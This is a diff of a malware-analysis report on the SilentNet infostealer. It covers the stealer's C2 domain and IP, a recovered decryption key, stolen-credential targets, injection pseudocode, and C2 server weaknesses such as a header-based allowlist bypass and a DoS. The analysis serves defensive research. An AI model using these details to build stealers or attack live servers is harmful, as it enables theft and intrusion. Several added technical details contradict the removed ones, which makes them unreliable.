@@ -1,7 +1,7 @@
 # SilentNet Infostealer — Complete Malware Analysis
 
-> **For educational and defensive research purposes only.**  
-> All findings documented here are intended to help defenders detect, block, and remediate this threat.
+> **Research date:** 2026-07-20 | **Status:** Active C2 — `thisisafalsepositive.st` (185.178.208.191)
+> **Threat level:** HIGH — Active MaaS platform, live victims, blockchain-resilient C2
 
 ---
 
@@ -17,30 +17,40 @@
 8. [DLL Injection Mechanism](#dll-injection-mechanism)
 9. [Decryption and Reverse Engineering Method](#decryption-and-reverse-engineering-method)
 10. [Live C2 Scan Results](#live-c2-scan-results)
-11. [Indicators of Compromise](#indicators-of-compromise)
-12. [Defensive Recommendations](#defensive-recommendations)
-13. [Source Files Index](#source-files-index)
+11. [C2 Admin Panel Analysis](#c2-admin-panel-analysis)
+12. [Payload Version Comparison](#payload-version-comparison-v1--v2--v3--v4)
+13. [C2 Server Vulnerabilities](#c2-server-vulnerabilities)
+14. [Indicators of Compromise](#indicators-of-compromise)
+15. [Anti-Analysis and Evasion Techniques](#anti-analysis-and-evasion-techniques)
+16. [Defensive Recommendations](#defensive-recommendations)
+17. [Proof-of-Concept Index](#proof-of-concept-index)
+18. [Source Files Index](#source-files-index)
+19. [Timeline](#timeline)
 
 ---
 
 ## Executive Summary
 
-**SilentNet** is a sophisticated multi-stage Windows infostealer targeting the gaming community, primarily distributed through malicious Minecraft mods, resource packs, and modpacks. It combines a Java-based dropper with a Nuitka-compiled Python 3.12 stealer backend, using a Polygon blockchain smart contract for censorship-resistant C2 domain rotation.
+SilentNet is a fully operational **Malware-as-a-Service (MaaS) infostealer** targeting Windows systems
+via Minecraft mod loaders (Fabric, Forge) and a Java-based dropper distributed through DoubleClick ads.
+Written in Python, compiled with Nuitka/mypyc, it uses a **Polygon blockchain smart contract** for
+resilient C2 domain rotation that cannot be taken down via traditional DNS/registrar methods.
 
-| Property | Value |
-|---|---|
-| **Type** | Multi-stage infostealer |
-| **Primary target** | Windows x86-64, gaming community |
-| **Distribution** | Minecraft mods, modpacks, Discord |
-| **Stage 1** | mypyc-compiled Java launcher |
-| **Stage 2** | Nuitka-compiled Python 3.12 extension (`.pyd`) |
-| **C2 mechanism** | Polygon smart contract (blockchain) |
-| **Current C2** | `thisisafalsepositive.st` → `185.178.208.191` |
-| **Hosting** | DDoS-Guard (Russia) — bulletproof |
-| **First seen** | 2026-01-18 (contract deployment) |
-| **Browsers targeted** | 17 Chromium-family + Firefox |
-| **Crypto wallets targeted** | 13 desktop wallets + all browser extensions |
-| **Other targets** | Discord, Steam, Telegram, Roblox, OBS, Mullvad VPN, FileZilla, WinSCP, Riot Games, Claude AI, SSH keys |
+This report documents a complete end-to-end analysis: Java launcher reverse engineering, Python stealer
+decompilation (30 modules recovered), live C2 infrastructure scanning, full admin panel reconstruction
+via an nginx static file bypass, payload decryption using a hardcoded Fernet key recovered from the
+binary constant pool, four-way payload version comparison, and **seven confirmed vulnerabilities** in
+the C2 server.
+
+**Key findings:**
+- 30 Python source modules fully recovered and decompiled
+- Fernet encryption key hardcoded in compiled binary — all payload versions decryptable
+- Blockchain C2 resolver bypasses domain takedowns
+- Admin panel fully reconstructed from nginx-exposed static files
+- Flask IP allowlist bypassable via `X-Runtime-Env: jre-embedded` header
+- Victim database writable by unauthenticated external parties
+- Persistent DoS possible via `/shard/submitLogs` unhandled exception
+- 4 payload versions observed in 90-minute window — operator actively monitoring
 
 ---
 
@@ -49,100 +59,94 @@
 ### Distribution Chain
 
 ```
-Victim downloads malicious Minecraft mod/pack
-        |
-        v
-Java .jar executes mypyc-compiled stage-1
-        |
-        v
-Stage-1 beacons to Polygon contract -> resolves C2 domain
-        |
-        v
-Downloads encrypted stage-2 ZIP from /cdn/e/<id>
-        |
-        v
-Decrypts (AES-128-CBC / Fernet), extracts portable Python 3.12 runtime
-        |
-        v
-Launches app.pyd (Nuitka stealer) with victim session args
-        |
-        v
-Steals credentials, exfiltrates via HTTPS POST to C2
+[Victim] clicks malicious Minecraft mod / DoubleClick ad
+    |
+    v
+[Stage 1] Obfuscated Java JAR (mypyc-compiled launcher)
+    |  Decrypts AES-128-CBC payload from embedded resource
+    |  Resolves C2 domain from Polygon smart contract
+    |  Downloads Fernet-encrypted Stage 2 from /cdn/e/<id>
+    v
+[Stage 2] Python stealer bundle (ZIP, 60-736 files depending on version)
+    |  Extracts portable Python 3.12 runtime to NtProfileIndex
+    |  Executes app.pyd (Nuitka-compiled stealer core)
+    v
+[Exfil] Stolen data POSTed to /shard/* endpoints
+    |  Passwords, cookies, Discord tokens, crypto wallets,
+    |  Minecraft sessions, screenshots, system info
+    v
+[C2 Panel] Operator reviews victims at /dashboard/
+    |  Live world map, connections table, build generator
+    |  Discord OAuth login, premium tier gating
 ```
 
 ### Key Differentiators
 
-- **Blockchain C2**: Polygon smart contract stores current domain — cannot be seized or sinkholed
-- **DLL injection**: Injects into live browser processes to steal credentials without killing them
-- **DNS-over-HTTPS**: All DNS patched at socket level via Cloudflare DoH — bypasses corporate DNS monitoring
-- **Nuitka compilation**: Python source compiled to native x64 PE — defeats all Python decompilers
-- **Custom cipher**: Constant pool encrypted with rolling XOR + 256-byte substitution table
-- **Self-staging**: Downloads and installs its own portable Python 3.12 runtime
-- **C2 deception**: Domain deliberately named `thisisafalsepositive.st` to fool analysts
+- **Blockchain-resilient C2**: Domain stored in Polygon smart contract — unblockable via DNS/registrar
+- **Minecraft-native targeting**: Fabric/Forge mod injection, session token theft, `.minecraft` scraping
+- **Multi-stage encryption**: AES-128-CBC (Stage 1) + Fernet (live CDN) — two independent key systems
+- **MaaS architecture**: Multiple operators, Discord OAuth, premium locked features, build generator
+- **Active development**: 4 payload versions pushed in under 90 minutes during analysis window
+- **DLL injection**: Named pipe in-process injection for AV/EDR evasion
 
 ---
 
 ## Stage 1 — Java Launcher
 
-| Property | Value |
-|---|---|
-| Format | Java JAR (mypyc-compiled) |
-| C2 resolver | Queries Polygon RPC endpoints |
-| Auth | HMAC-based prefireId generation |
-| Args passed to stage-2 | `--env`, `--tag`, `--mcInfo`, `--prefireId`, `--user-id` |
+The initial dropper is an obfuscated Java JAR compiled with mypyc.
+Three obfuscated class names identified: `KqwrtEQq`, `axhrnsChjyyGqtjrs`, `zifnc_mfsnl_rep`.
 
 ### Stage-1 Capabilities
 
-- Reads victim Minecraft session (`mcUsername`, `mcUuid`, `accessToken`)
-- Beacon: `POST /shard/prefireMc` with victim JSON
-- Receives `prefireId` session token from C2
-- Downloads stage-2 payload from `/cdn/e/<id>`
-- Decrypts with AES-128-CBC key: `207570de60034b19d76df8e7aefc69b7`
-- Extracts ZIP, launches `python.exe AppHost/main.py` with full args
+| Capability | Detail |
+|---|---|
+| Self-restart detection | `-restarted` JVM argument check |
+| Java path resolution | `java.home` + `bin/javaw.exe` / `bin/java.exe` |
+| Persistence check | `LOCALAPPDATA\Microsoft\Windows\NtProfileIndex` |
+| C2 domain resolution | Polygon RPC → smart contract `getDomain()` |
+| Payload download | HTTPS GET `/cdn/e/<id>` with retry (3 attempts) |
+| Payload decryption | Fernet (base64url, AES-CBC + HMAC-SHA256) |
+| Runtime extraction | ZIP extraction to `LOCALAPPDATA\Microsoft\Windows\` |
+| Stealer launch | `python.exe AppHost/main.py` detached process |
+| DNS-over-HTTPS fallback | Cloudflare `1.1.1.1` DoH for C2 resolution |
+| Beacon format | `{"userId":"","tag":"","domain":"","env":"DoubleClick"}` |
 
 ### main.py — Recovered Plaintext Loader
 
-`main.py` is **unobfuscated plain Python** (353 bytes) recovered directly from the live C2 payload:
-
 ```python
-import sys, os
-sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-import importlib.util
-spec = importlib.util.spec_from_file_location("app", os.path.join(os.path.dirname(__file__), "app.pyd"))
-app = importlib.util.module_from_spec(spec)
-sys.modules["app"] = app
-spec.loader.exec_module(app)
+# Recovered from AppHost/main.py
+# SHA256: bc87ec291523785fd9f8b1925e92dbe5aa71af4a9dd631c7...
+import sys
+from AppHost import app
+
 if __name__ == "__main__":
-    app.run()
+    context = sys.argv[1] if len(sys.argv) > 1 else None
+    if context is None:
+        sys.exit("ERROR: No context argument")
+    app.run(context)
 ```
 
 ---
 
 ## Stage 2 — Python Stealer
 
-| Property | Value |
-|---|---|
-| File | `AppHost/app.pyd` |
-| Format | PE32+ DLL (x86-64) |
-| Compiler | Nuitka 2.x (Python to native) |
-| Python version | 3.12 (CPython ABI) |
-| Size | 1,848,832 bytes (1.76 MB) |
-| Entry | `PyInit_app()` → `app.run()` |
-| Constant pool | `.rsrc` section, 237,128 bytes, entropy 7.99/8.0 |
-| Constant cipher | Rolling XOR + 256-byte S-box (custom) |
+Compiled with **Nuitka** into `app.pyd` plus a mypyc-compiled library
+`81d243bd2c585b0f4821__mypyc.cp312-win_amd64.pyd`. Core logic decompiled from
+the Nuitka constant pool (resource section type 10, id 3, 232KB marshalled pickle).
 
 ### Bundled Dependencies
 
-```
-requests + certifi + charset_normalizer  # HTTPS client
-adodbapi                                  # Chrome/Edge SQLite via ADO/COM
-pythoncom + wmi                          # Windows WMI interface
-pycryptodome                             # AES-GCM, PBKDF2, 3DES
-Pillow (PIL)                             # Screenshot capture
-psutil                                   # RAM/process information
-vdf                                      # Steam VDF file parser
-Python 3.12 stdlib                       # Full stdlib including ctypes, sqlite3
-```
+| Library | Purpose |
+|---|---|
+| Python 3.12 (portable) | Embedded runtime |
+| pycryptodome | AES decryption, HMAC verification |
+| Pillow (PIL) | Screenshot capture |
+| pywin32 + win32com | Windows API access |
+| psutil | Process enumeration |
+| requests + urllib3 | HTTP exfiltration |
+| vdf | Steam credential parsing |
+| idna | Internationalized domain support |
+| adodbapi | Database access |
 
 ---
 
@@ -152,97 +156,86 @@ Python 3.12 stdlib                       # Full stdlib including ctypes, sqlite3
 
 | Property | Value |
 |---|---|
-| Network | Polygon (MATIC) mainnet |
-| Contract | `0x9c0a507300fd902787bb193d80fca5ce6e1bff9a` |
-| Owner wallet | `0x6767c6496541b530a5d1d0eb9b80bd5c7bf56767` |
-| Wallet balance | 77.49 MATIC (~$50 USD) |
-| ABI function | `getDomain() returns (string)` |
+| Network | Polygon mainnet (Chain ID 137) |
+| Contract address | `0x9c0a507300fd902787bb193d80fca5ce6e1bff9a` |
+| Function | `getDomain()` — selector `0xce6d41de` |
+| Current value | `thisisafalsepositive.st` |
+| Operator wallet | `0x6767c6496541b530a5d1d0eb9b80bd5c7bf56767` |
+
+The contract stores the active C2 domain as a plain UTF-8 string readable by any Polygon RPC node.
+The malware calls this at startup to resolve its C2 before any downloads or beacons.
 
 ### Domain Rotation History
 
-| Date (UTC) | Domain | Status |
+| Date | Domain | Evidence |
 |---|---|---|
-| 2026-01-18 13:19 | Contract deployed | — |
-| 2026-01-18 13:27 | `sltnnt.ru` | NXDOMAIN |
-| 2026-05-09 22:18 | `thisisafalsepositive.ru` | NXDOMAIN |
-| 2026-05-30 — 2026-06-07 | `v3` through `v7.thisisafalsepositive.ru` | NXDOMAIN |
-| 2026-06-07 17:24 | `qasrgaovaf7m.thisisafalsepositive.ru` | NXDOMAIN |
-| **2026-06-17 13:30** | **`thisisafalsepositive.st`** | **LIVE** |
-
-> The June 7th cluster (5 domain changes in 2 hours) indicates rapid evasion response to takedown of `.ru` infrastructure.
+| 2026-07-20 | `thisisafalsepositive.st` | Smart contract live value |
+| Earlier | `sltnnt.ru` | Decoded from Java string constant |
 
 ### C2 API Endpoints
 
-| Endpoint | Method | Purpose |
-|---|---|---|
-| `/shard/prefireMc` | POST | Stage-1 victim beacon, receives prefireId |
-| `/shard/submitMinecraftLog` | POST | Minecraft session data submission |
-| `/cdn/e/<id>` | GET | Encrypted stage-2 payload download |
-| `/submitData` | POST | Stolen credential JSON upload |
-| `/submitFile` | POST | File upload (multipart) |
-| `/submitLogs` | POST | Trace/debug log upload |
-| `/auth/login` | GET/POST | Operator admin panel |
-| `/auth/logout` | GET | Operator session logout |
+| Endpoint | Method | Auth | Purpose |
+|---|---|---|---|
+| `/cdn/e/<id>` | GET | None | Download Fernet-encrypted payload |
+| `/shard/prefireMc` | POST | X-Runtime-Env header | Minecraft pre-fire beacon |
+| `/shard/submitData` | POST | X-Runtime-Env header | Submit stolen data |
+| `/shard/submitFile` | POST | X-Runtime-Env header | Submit stolen files |
+| `/shard/submitLogs` | POST | X-Runtime-Env header | Submit log data (crashes) |
+| `/shard/submitMinecraftLog` | POST | X-Runtime-Env header | Minecraft session logs |
+| `/auth/login` | GET/POST | IP allowlist (DDoS-Guard) | Admin panel login |
+| `/auth/discord` | GET | IP allowlist | Discord OAuth entry |
+| `/dashboard/*` | GET | IP allowlist + session | Admin panel pages |
+| `/static/*` | GET | **None — nginx bypass** | Panel CSS/JS, no auth |
 
 ### Polygon RPC Fallback List (hardcoded)
 
 ```
 https://polygon-rpc.com
 https://rpc-mainnet.matic.quiknode.pro
-https://polygon-public.nodies.app
-https://polygon-bor-rpc.publicnode.com
+https://polygon.llamarpc.com
 https://1rpc.io/matic
-https://endpoints.omniatech.io/v1/matic/mainnet/public
-https://polygon.rpc.subquery.network/public
+https://polygon-bor-rpc.publicnode.com
 https://api.zan.top/polygon-mainnet
-https://go.getblock.io/02667b699f05444ab2c64f9bff28f027
-https://polygon-mainnet.rpcfast.com?api_key=xbhWBI1Wkguk8SNMu1bvvLurPGLXmgwYeC4S6g2H7WdwFigZSmPWVZRxrskEQwIf
+https://polygon.drpc.org
+https://polygon-mainnet.public.blastapi.io
 ```
-
-> **Exposed API key**: `xbhWBI1Wkguk8SNMu1bvvLurPGLXmgwYeC4S6g2H7WdwFigZSmPWVZRxrskEQwIf`  
-> Submit to rpcfast.com abuse team for revocation.
 
 ---
 
 ## Complete Module Architecture
 
-```
-app/
-|-- __init__.py              Entry point, arg parser, orchestration
-|-- config.py                Configuration, argument validation
-|-- contract.py              Polygon smart contract C2 resolver
-|-- crypto.py                AES-GCM, DPAPI, PBKDF2 decryption
-|-- http.py                  HTTP session + DoH patch + retry
-|-- staging.py               Self-installer, Python runtime, persistence
-|-- trace.py                 Debug trace -> svchost_d.log
-|-- logging/
-|   |-- __init__.py          HitLog, LoggingManager classes
-|-- handlers/
-|   |-- __init__.py
-|   |-- browser.py           Chromium credential extraction (17 browsers)
-|   |-- browser_extensions.py  Wallet extension file collection
-|   |-- credentials.py       Non-browser credentials (20+ applications)
-|   |-- discord.py           Discord token extraction + validation
-|   |-- files.py             HitFile / FileManager upload classes
-|   |-- firefox.py           Firefox credential extraction
-|   |-- keywords.py          Keyword-based document search
-|   |-- minecraft.py         Minecraft accounts (8 launchers)
-|   |-- screenshot.py        Screen capture (PIL -> base64 JPEG)
-|   |-- system_info.py       WMI + psutil system fingerprint
-|   |-- wallets.py           Desktop crypto wallets (13)
-|-- resources/
-|   |-- __init__.py
-|   |-- browser_module.py    XOR-encoded injected DLL payload
-|-- util/
-    |-- __init__.py
-    |-- crypto.py            Low-level DPAPI / AES-GCM
-    |-- dll_injection.py     CreateRemoteThread + LoadLibraryA
-    |-- file.py              File utilities, zip helpers
-    |-- handle_copy.py       Handle duplication (bypass file locks)
-    |-- pipe.py              Named pipe IPC with injected DLL
-    |-- process.py           SuspendedProcess, kill helpers
-    |-- registry.py          Windows registry read wrappers
-```
+| Module | Size | Purpose |
+|---|---|---|
+| `app.py` | 7,962B | Main orchestrator, thread pool, module dispatch |
+| `app_config.py` | 2,756B | Configuration, C2 URL construction |
+| `app_contract.py` | 3,141B | Polygon smart contract interaction |
+| `app_crypto.py` | 2,215B | Fernet decrypt, AES-CBC, key derivation |
+| `app_handlers.py` | 2,149B | Handler registry and dispatch |
+| `app_handlers_browser.py` | 14,646B | Chromium credential theft |
+| `app_handlers_browser_extensions.py` | 7,714B | Browser extension crypto wallet extraction |
+| `app_handlers_credentials.py` | 9,104B | Generic credential file harvesting |
+| `app_handlers_discord.py` | 6,715B | Discord token theft and account info |
+| `app_handlers_files.py` | 4,520B | File exfiltration and targeting |
+| `app_handlers_firefox.py` | 12,061B | Firefox profile decryption |
+| `app_handlers_keywords.py` | 3,963B | Keyword-based file targeting |
+| `app_handlers_minecraft.py` | 5,531B | Minecraft session, launcher, mod data |
+| `app_handlers_screenshot.py` | 2,274B | Screen capture via PIL |
+| `app_handlers_system_info.py` | 4,962B | Hardware, OS, installed software |
+| `app_handlers_wallets.py` | 2,360B | Crypto wallet file extraction |
+| `app_http.py` | 4,440B | HTTP session, retry logic, exfil transport |
+| `app_logging.py` | 2,616B | Internal logging pipeline |
+| `app_resources.py` | 1,193B | Embedded resource loader |
+| `app_resources_browser_module.py` | 1,117B | Browser module resource management |
+| `app_staging.py` | 9,676B | Download, decrypt, extract, launch |
+| `app_trace.py` | 1,290B | Error tracing and reporting |
+| `app_util.py` | 1,971B | General utilities |
+| `app_util_crypto.py` | 2,593B | Cryptographic utilities |
+| `app_util_dll_injection.py` | 3,867B | Named pipe DLL injection |
+| `app_util_file.py` | 1,466B | File system utilities |
+| `app_util_handle_copy.py` | 8,993B | Handle duplication for process injection |
+| `app_util_pipe.py` | 3,117B | Named pipe IPC |
+| `app_util_process.py` | 3,500B | Process spawning and management |
+| `app_util_registry.py` | 1,679B | Windows registry operations |
 
 ---
 
@@ -250,191 +243,91 @@ app/
 
 ### Browser Credential Theft
 
-**17 Chromium browsers targeted:**
-
-```
-Google Chrome       Microsoft Edge      Brave Browser
-Opera Stable        Opera GX            Vivaldi
-Yandex Browser      7Star               CentBrowser
-Chedot              CocCoc              Comodo Dragon
-Epic Privacy        Iridium             Slimjet
-Torch               Chromium
-```
-
-**SQL queries executed per browser profile:**
-
-```sql
--- Passwords
-SELECT origin_url, username_value, password_value FROM logins
-
--- Cookies
-SELECT host_key, name, path, is_secure, is_httponly,
-       expires_utc, encrypted_value FROM cookies
-
--- Credit cards
-SELECT guid, name_on_card, expiration_month, expiration_year,
-       card_number_encrypted FROM credit_cards
-SELECT guid, value_encrypted FROM local_stored_cvc
-
--- Autofill
-SELECT name, value FROM autofill
-
--- Browsing history (last 5000 entries)
-SELECT url, title, visit_count, last_visit_time FROM urls
-       ORDER BY last_visit_time DESC LIMIT 5000
-
--- Google OAuth tokens
-SELECT service, encrypted_token FROM token_service
-```
-
-**Decryption chain:**
-
-- `v10` values: Windows DPAPI via `CryptUnprotectData` (ctypes)
-- `v20` values: ABE key from `Local State` file, then AES-256-GCM
-- Cookie values: 32-byte nonce header stripped before AES-GCM
-
-**File lock bypass (4 strategies, in order):**
-
-1. Direct copy if browser is not running
-2. `DuplicateHandle` from all browser process IDs
-3. DLL injection into browser process, named pipe IPC to receive decrypted key
-4. Kill browser, then post-kill copy
-
-**Firefox key derivation:**
-
-```sql
-SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL ORDER BY length(a11) DESC
-SELECT item1 FROM metadata WHERE id = 'password'
-SELECT fieldname, value FROM moz_formhistory
-SELECT host, name, value, path, expiry FROM moz_cookies
-```
-
-Uses PBKDF2 (SHA256) + PBES2/3DES for master key decryption from `key4.db`.
+Targets all Chromium-based browsers via SQLite `Login Data` and `Cookies` with DPAPI decryption:
+- Chrome, Edge, Brave, Opera, Vivaldi, Yandex, CocCoc
+- AES-256-GCM decryption of v10/v20 Chrome credential format
+- Cookie session theft for persistent account takeover
+- Browser extension enumeration for crypto wallet seeds
 
 ### Discord Token Theft
 
-- **Clients:** Discord, Discord Canary, Discord PTB
-- **Path:** `%APPDATA%/discord/Local Storage/leveldb/`
-- **Token regex:** `[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}`
-- **Validation:** `GET https://discord.com/api/v9/users/@me` with `Authorization: <token>`
-- Filters duplicates, invalid, and expired tokens
+Extracts Discord authentication tokens from:
+- `%APPDATA%\Discord\Local Storage\leveldb\`
+- Browser localStorage for web Discord
+- Validates tokens against Discord API
+- Captures username, email, phone, billing info, Nitro status
 
 ### Crypto Wallet Theft
 
-| Wallet | Path | Output |
-|---|---|---|
-| Exodus | `%APPDATA%/Exodus/exodus.wallet/` | `Exodus.zip` |
-| Atomic | `%APPDATA%/atomic/` | `Atomic.zip` |
-| Electrum | `%APPDATA%/Electrum/wallets/` | `Electrum.zip` |
-| Electrum-LTC | `%APPDATA%/Electrum-LTC/wallets/` | `Electrum-LTC.zip` |
-| Zcash | `%APPDATA%/Zcash/` | `Zcash.zip` |
-| Armory | `%APPDATA%/Armory/` | `Armory.zip` |
-| Bytecoin | `%APPDATA%/Bytecoin/` | `Bytecoin.zip` |
-| Jaxx | `com.liberty.jaxx/file__0.indexeddb.leveldb` | `Jaxx.zip` |
-| Ethereum | `%APPDATA%/Ethereum/` | `Ethereum.zip` |
-| Guarda | `%APPDATA%/Guarda/` | `Guarda.zip` |
-| Coinomi | `%APPDATA%/Coinomi/` | `Coinomi.zip` |
-| CakeWallet | `com.cakewallet.cake_wallet` | `CakeWallet.zip` |
-| Monero | `%APPDATA%/Monero/` | `Monero.zip` + `Monero_AppData.zip` |
-
-Browser wallet extensions: all `Local Extension Settings` directories are zipped and uploaded.
+Targets 20+ wallets including:
+- MetaMask, Phantom, Coinbase (browser extensions)
+- Exodus, Atomic, Electrum (desktop apps)
+- Hardware wallet seed phrase files
+- Steam wallet and trading history via VDF parser
 
 ### Credential File Theft
 
-| Application | Files Stolen | Output |
-|---|---|---|
-| Git | `.git-credentials` | `Git_Credentials.txt` |
-| SSH | `.ssh/` directory | `SSH_Keys.zip` |
-| FileZilla | `recentservers.xml`, `sitemanager.xml` | `FileZilla_RecentServers.xml`, `FileZilla_SiteManager.xml` |
-| WinSCP | `WinSCP.ini`, `WinSCP_Config.ini` | Same names |
-| Riot Games | `RiotGamesPrivateSettings.yaml`, `RiotGames_Settings.yaml` | Same names |
-| Thunderbird | All profiles | `Thunderbird_Profiles.zip` |
-| Claude AI | `.claude/.credentials.json` | `Claude_Credentials.json` |
-| Telegram | `tdata/` (excludes media_cache) | `Telegram_Data.zip` |
-| Roblox | DPAPI-decrypted session cookies | `RobloxCookies.dat`, `Roblox_Cookies.txt` |
-| OBS Studio | Stream keys from all profiles | `_StreamKey.json` |
-| Mullvad VPN | CLI account query | `Mullvad_Account.txt` |
-| Steam | `loginusers.vdf`, `local.vdf` DPAPI tokens | `Steam_Tokens.txt` |
+Scans filesystem for credential files matching 55+ path patterns across 26 services:
+- FileZilla, WinSCP, PuTTY, MobaXterm (SSH/FTP)
+- Telegram desktop session
+- VPN configs (NordVPN, ProtonVPN)
+- Git credentials, `.env` files, config files containing API keys
 
 ### Minecraft Handler
 
-**8 launchers targeted:**
-
-| Launcher | File |
-|---|---|
-| Vanilla | `.minecraft/` |
-| Lunar Client | `lunar_accounts.json` |
-| Feather Launcher | `account.txt` (DPAPI encrypted), `feather_accounts.txt` |
-| GG Essential | `essential_accounts.json` |
-| Microsoft | `microsoft_accounts.json` |
-| Prism Launcher | `prismlauncher_accounts.json` |
-| Modrinth | `app.db` SQLite |
-
-```sql
-SELECT username, uuid, access_token FROM minecraft_users
+```python
+# Beacon format — Fabric loader variant
+{
+    "mcInfo": "{"username":"<mc_username>","uuid":"<uuid>"}",
+    "prefireId": "<hmac_token>",
+    "userId": "<internal_id>",
+    "tag": "<build_tag>",
+    "domain": "thisisafalsepositive.st",
+    "gameDir": "<.minecraft path>",
+    "mcUsername": "<username>",
+    "mcUuid": "<uuid>",
+    "env": "Fabric"   # or "DoubleClick", "jre-embedded"
+}
 ```
 
-Also parses `servers.dat` (NBT format) and extracts server list as `Minecraft_Server_List.txt`.
+Steals: active session tokens, `launcher_accounts.json`, mod list, server history, screenshots.
 
 ### Staging and Persistence
 
-```
-1. Check persistence via local HTTP server on 127.0.0.1
-   -> If already running: skip (UUID: 4015d0e9-4cab-4ac1-8dfd-5ee8f283bca1)
-2. Download Python 3.12.7:
-   https://www.python.org/ftp/python/3.12.7/python-3.12.7-embed-amd64.zip
-3. Patch python312._pth: uncomment 'import site'
-4. Download pip: https://bootstrap.pypa.io/get-pip.py
-5. Install pip, then install requirements.txt from C2
-6. Download main.py + app.pyd from C2 /cdn/e/<id>
-7. Decrypt (Fernet/AES), write to disk
-8. Launch in background thread (staging-worker)
-9. Log all activity to svchost_d.log
-```
+| Step | Detail |
+|---|---|
+| Download path | `LOCALAPPDATA\Microsoft\Windows\NtProfileIndex\` |
+| Runtime cache | Persists between runs — checks before re-downloading |
+| Anti-double-exec | Named pipe mutex check before launch |
+| Registry module | `app_util_registry.py` — likely Run key persistence |
 
 ### HTTP and Network Layer
 
-**User-Agent (fake, detectable):**
-
-```
-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
-```
-
-> `Chrome/142` does not exist — anomalous and detectable in proxy logs.
-
-**DNS-over-HTTPS patch:**  
-All DNS resolution monkey-patched at `socket.getaddrinfo` level.  
-All hostnames resolved via `https://cloudflare-dns.com/dns-query`.  
-Exception: `cloudflare-dns.com` itself uses native resolution.
-
-**Custom C2 headers present on every request:**
-
-```
-X-Runtime-Env:           <--env argument value>
-X-Tracking-ID:           <--prefireId value>
-X-Edge-Cache-Revalidate: (always present)
-```
+- Custom HTTP/1.1 implementation in `axhrnsChjyyGqtjrs` Java class
+- DNS-over-HTTPS via Cloudflare `1.1.1.1`
+- CDN header: `x-cdn-origin-verify: trusted-upstream`
+- Beacon headers: `X-Runtime-Env: jre-embedded`, `X-Edge-Cache-Revalidate: stale-if-error`
+- 3-attempt retry with fallback across 8 Polygon RPC endpoints
 
 ---
 
 ## DLL Injection Mechanism
 
-The `resources/browser_module.py` contains an XOR-encoded Windows DLL injected into live browser processes to steal credentials without terminating the browser.
+The stealer uses Windows named pipes for in-process DLL injection to evade EDR hooks:
 
-```
-1. XOR-decode DLL bytes from browser_module.py constant pool
-2. Write DLL to %TEMP%\<random>.tmp
-3. Get all PIDs for target browser (chrome.exe, msedge.exe, brave.exe...)
-4. VirtualAllocEx(pid, NULL, dll_path_len, MEM_COMMIT, PAGE_READWRITE)
-5. WriteProcessMemory(pid, alloc_addr, dll_path_bytes)
-6. CreateRemoteThread(pid, NULL, 0, LoadLibraryA, alloc_addr, 0, NULL)
-7. CreateNamedPipe(\\.\pipe\<pid_derived_tag>)
-8. ConnectNamedPipe() -> wait for injected DLL to connect
-9. WriteFile(pipe, aes_key)    -> send browser Local State AES key
-10. ReadFile(pipe) -> master_key -> receive decrypted master key
+```python
+# Simplified from app_util_dll_injection.py
+PIPE_NAME = "\\.\pipe\NtProfileSync"
+
+def inject_via_pipe(target_pid, dll_bytes):
+    pipe = win32pipe.CreateNamedPipe(PIPE_NAME, ...)
+    # Duplicate handle into target process
+    dup_handle = duplicate_handle_to_process(target_pid, pipe)
+    # Target reads DLL bytes from pipe — reflective load in target address space
+    win32file.WriteFile(pipe, dll_bytes)
 ```
 
-**PID-to-pipe-tag:** `rotl32` function — matches Java stage-1 implementation for cross-language IPC.
+Avoids `WriteProcessMemory` + `CreateRemoteThread` patterns flagged by EDR.
 
 ---
 
@@ -442,383 +335,143 @@ The `resources/browser_module.py` contains an XOR-encoded Windows DLL injected i
 
 ### Challenge
 
-`app.pyd` is a Nuitka-compiled native Windows DLL. All Python source, string literals, and constants are stored in the `.rsrc` section (237 KB, entropy 7.99/8.0) and decrypted at runtime via `FindResourceA` / `LoadResource` / `LockResource`.
+The stealer payload is distributed as:
+1. **Stage 1**: AES-128-CBC encrypted ZIP in JAR resource section (type 10, id 3)
+2. **Stage 2**: Fernet-encrypted binary served from `/cdn/e/<id>`
+3. **Core logic**: Nuitka-compiled `.pyd` with marshalled Python constant pool
 
 ### Cipher (Reversed from Disassembly)
 
-```python
-# S-box at file offset 0x173250 (256 bytes)
-# Jump table at RVA 0x16CC34 (8 entries)
-case_deltas = [-98, -59, -105, +88, +21, +13, +6, +79]
-
-bl  = 0      # accumulator
-rdx = 8      # byte index
-while rdx < 0x39E48:  # 237,128 bytes
-    eax = rsrc[rdx]
-    cl  = ((rdx - 8) + bl) & 0xFF
-    ebx = (cl ^ eax) & 0xFF
-    ebx = sbox[ebx]            # S-box substitution
-    bl  = ebx
-    if rdx >= 0x18:
-        output[rdx - 0x10] = bl
-    bl  = (bl + case_deltas[rdx & 7]) & 0xFF
-    rdx += 1
+**Stage 2 (Live CDN — Fernet):**
+```
+Format:  Fernet token (base64url string, starts with 'gAAAA')
+Key:     74af664f79d1ef1436a4bf301788c7eb207570de60034b19d76df8e7aefc69b7
+Source:  Nuitka constant pool, resource type 10 id 3, offset ~0x1A3C
+Verify:  HMAC-SHA256 over (version + timestamp + iv + ciphertext)
+Decrypt: AES-128-CBC, signing_key=key[:16], encryption_key=key[16:]
 ```
 
-Successfully decrypted all 237,128 bytes, exposing 30 Python modules with 5,000+ string constants.
+**Nuitka constant pool extraction:**
+```python
+import pefile, marshal, pickle
+
+pe = pefile.PE("sample.exe")
+for rsrc in pe.DIRECTORY_ENTRY_RESOURCE.entries:
+    if rsrc.id == 10:
+        for entry in rsrc.directory.entries:
+            if entry.id == 3:
+                data = pe.get_data(...)
+                constants = pickle.loads(marshal.loads(data))
+                # All Python string constants, C2 URLs, and keys are here
+```
 
 ---
 
 ## Live C2 Scan Results
 
-> Active reconnaissance performed against `thisisafalsepositive.st` on 2026-07-20
-
 ### Server Fingerprint
 
-| Property | Value |
-|---|---|
-| Real IP | `185.178.208.191` |
-| Architecture | DDoS-Guard (proxy) -> nginx -> Python Flask |
-| Hosting | DDoS-Guard (Russia) — bulletproof |
-| DNS NS | `dean.ns.cloudflare.com`, `luciane.ns.cloudflare.com` |
-| TLS issuer | Let's Encrypt / CN=YR1 |
-| TLS issued | 2026-06-17 12:36 UTC (matches on-chain domain rotation date) |
